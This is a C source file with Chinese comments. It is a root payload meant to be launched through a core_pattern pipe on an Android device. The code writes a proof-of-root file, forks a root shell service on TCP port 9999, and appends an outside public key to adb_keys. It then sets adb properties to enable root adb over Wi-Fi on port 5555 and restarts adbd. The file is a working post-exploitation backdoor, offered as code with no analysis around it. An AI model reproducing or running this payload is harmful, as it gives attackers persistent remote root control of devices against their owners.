/*
 * rootpay.c —— 由 core_pattern 管道以 root 身份执行的 payload
 * 用纯 C 写，不依赖 PATH / shell / 环境，任何一步失败都写日志。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdarg.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>

/* payload 与 rootsvc / adbkey.pub 所在目录。编译时可覆盖：
 *   clang -DROOTPAY_DIR=\"/your/dir\" -o rootpay rootpay.c */
#ifndef ROOTPAY_DIR
#define ROOTPAY_DIR "/data/local/tmp"
#endif
#define PROBE ROOTPAY_DIR

static int g_log = -1;

static void lg(const char *fmt, ...)
{
    char buf[2048];
    va_list ap;
    int n;
    va_start(ap, fmt);
    n = vsnprintf(buf, sizeof buf, fmt, ap);
    va_end(ap);
    if (n > 0 && g_log >= 0) { ssize_t r = write(g_log, buf, n); (void)r; fsync(g_log); }
}

static void put_file(const char *path, const void *data, size_t len, mode_t mode)
{
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (fd < 0) { lg("  open(%s) 失败: %s\n", path, strerror(errno)); return; }
    if (write(fd, data, len) != (ssize_t)len) lg("  write(%s) 失败: %s\n", path, strerror(errno));
    close(fd);
    chmod(path, mode);
}

int main(int argc, char **argv)
{
    /* 先把 core 管道从 stdin 上摘掉 */
    int devnull = open("/dev/null", O_RDWR);
    if (devnull >= 0) dup2(devnull, 0);

    g_log = open(PROBE "/pay.log", O_WRONLY | O_CREAT | O_TRUNC, 0666);

    lg("=== rootpay 启动 uid=%d euid=%d gid=%d argc=%d ===\n",
       getuid(), geteuid(), getgid(), argc);
    for (int i = 0; i < argc; i++) lg("argv[%d] = %s\n", i, argv[i]);

    /* ---------- 1) 留下 root 证据 ---------- */
    {
        char proof[256];
        int n = snprintf(proof, sizeof proof, "uid=%d euid=%d gid=%d\n",
                         getuid(), geteuid(), getgid());
        put_file(PROBE "/ROOT_RAN2", proof, n, 0666);
        lg("ROOT_RAN2 已写\n");
    }

    /* ---------- 2) 拉起 root shell 服务（TCP 9999）---------- */
    {
        pid_t p = fork();
        if (p == 0) {
            setsid();
            int fd = open(PROBE "/rootsvc.log", O_WRONLY | O_CREAT | O_APPEND, 0666);
            if (fd >= 0) { dup2(fd, 1); dup2(fd, 2); }
            execl(PROBE "/rootsvc", "rootsvc", (char *)NULL);
            _exit(127);
        }
        lg("rootsvc fork pid=%d\n", (int)p);
    }

    /* ---------- 3) adb over WiFi：写授权公钥 ---------- */
    {
        char key[8192];
        int kf = open(PROBE "/adbkey.pub", O_RDONLY);
        ssize_t n = (kf >= 0) ? read(kf, key, sizeof key) : -1;
        if (kf >= 0) close(kf);

        mkdir("/data/misc/adb", 0750);
        chown("/data/misc/adb", 1000, 2000);
        chmod("/data/misc/adb", 02750);

        if (n > 0) {
            int af = open("/data/misc/adb/adb_keys", O_WRONLY | O_CREAT | O_APPEND, 0640);
            if (af >= 0) {
                ssize_t w = write(af, key, n);
                close(af);
                chown("/data/misc/adb/adb_keys", 1000, 2000);
                chmod("/data/misc/adb/adb_keys", 0640);
                lg("adb_keys 写入 %zd 字节 (write=%zd)\n", n, w);
            } else {
                lg("adb_keys 打开失败: %s\n", strerror(errno));
            }
        } else {
            lg("读不到 adbkey.pub (n=%zd): %s\n", n, strerror(errno));
        }
    }

    /* ---------- 4) adb over WiFi：属性 + 重启 adbd ---------- */
    {
        const char *cmd =
            "/system/bin/setprop service.adb.root 1; "
            "/system/bin/setprop service.adb.tcp.port 5555; "
            "/system/bin/setprop persist.adb.tcp.port 5555; "
            "/system/bin/setprop sys.adb.enable 1; "
            "/system/bin/setprop ctl.restart adbd; "
            "/system/bin/sleep 2; "
            "/system/bin/getprop init.svc.adbd; "
            "/system/bin/id";

        pid_t c = fork();
        if (c == 0) {
            int fd = open(PROBE "/adbcfg.log", O_WRONLY | O_CREAT | O_TRUNC, 0666);
            if (fd >= 0) { dup2(fd, 1); dup2(fd, 2); }
            execl("/system/bin/sh", "sh", "-c", cmd, (char *)NULL);
            _exit(127);
        }
        int st = 0;
        waitpid(c, &st, 0);
        lg("adb 配置命令返回 status=%d\n", st);
    }

    lg("=== 全部完成 ===\n");
    if (g_log >= 0) close(g_log);
    return 0;
}
